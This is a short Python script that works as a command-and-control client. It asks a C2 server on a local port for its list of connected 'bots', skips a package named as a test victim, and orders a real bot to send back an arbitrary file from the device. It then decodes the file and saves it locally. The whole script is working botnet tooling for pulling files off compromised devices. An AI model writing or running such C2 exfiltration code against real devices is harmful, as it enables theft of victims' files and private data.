#!/usr/bin/env python3
"""Pulls a file off the live bot through the C2 and writes it locally."""
import base64
import json
import socket
import sys

CONTROL = ("127.0.0.1", 8778)


def call(req, timeout=90):
    s = socket.create_connection(CONTROL, timeout=timeout)
    s.settimeout(None)
    s.sendall(json.dumps(req).encode() + b"\n")
    buf = b""
    while b"\n" not in buf:
        c = s.recv(65536)
        if not c:
            break
        buf += c
    s.close()
    return json.loads(buf.split(b"\n")[0].decode())


def main():
    remote = sys.argv[1]
    local = sys.argv[2] if len(sys.argv) > 2 else "/tmp/pulled.bin"
    bots = call({"op": "list"}, timeout=15).get("bots", [])
    real = [b for b in bots if b["info"].get("package") != "com.example.victim"]
    if not real:
        print("no real bot")
        return 1
    bid = real[0]["id"]
    r = call({"op": "cmd", "bot": bid, "cmd": "pull",
              "args": {"path": remote}, "timeout": 60}, timeout=80)
    res = r.get("result", {})
    if not res.get("ok"):
        print("pull failed:", json.dumps(r)[:300])
        return 1
    data = base64.b64decode(res["b64"])
    with open(local, "wb") as f:
        f.write(data)
    print(f"pulled {len(data)} bytes -> {local}")
    print("magic:", data[:8].hex())
    return 0


if __name__ == "__main__":
    sys.exit(main())
